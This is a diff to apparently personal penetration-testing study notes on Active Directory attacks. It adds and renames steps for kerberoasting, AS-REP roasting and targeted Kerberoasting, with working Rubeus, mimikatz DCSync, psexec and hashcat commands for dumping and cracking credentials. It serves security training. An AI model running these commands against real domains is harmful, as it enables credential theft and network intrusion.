@@ -272,8 +272,7 @@ psexec.exe -accepteula \\<remote_hostname> cmd
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
-## Targeted AS-REP roasting
-
+## AS-REP roasting
 ### on Kali
 - condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled 
 - Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting without using previously found password, then **obtain their password** thru AS-REP hashes
@@ -362,8 +361,14 @@ runas /user:<hostname>\<user> cmd.exe
 ### On Windows
 - Method 1 (Reubeus)
 ```bash
-#automatically find kerberoastable users  in targeted Domain
+#automatically find kerberoastable users in targeted Domain and transfer the output hash to kali
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+#on kali, see hash contain to identify the hash type
+cat hashes.kerberoast
+
+#find the corresponding hash type number in hashcat
+hashcat --help | grep -i "Kerberos"
 
 #crack hash using hashcat 13100, TGS-REP, output is plaintext password of kerberoastable account
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
@@ -395,6 +400,13 @@ mimikatz # kerberos :: list /export
 #crack hash using kirbi2john.py
 python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 ```
+
+## Targeted Kerberoasting
+### on Kali
+- condition: we have GenericWrite or GenericAll permissions on another AD user account
+- leveraging "GenericWrite or GenericAll" permissions, (1) reset the user's password but this may raise suspicion. or (2) set an SPN for the user.
+- kerberoast the account **(same as normal kerberoast)**
+- crack the password hash **(same as normal kerberoast)**
 
 # Tools Introduction
 -   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
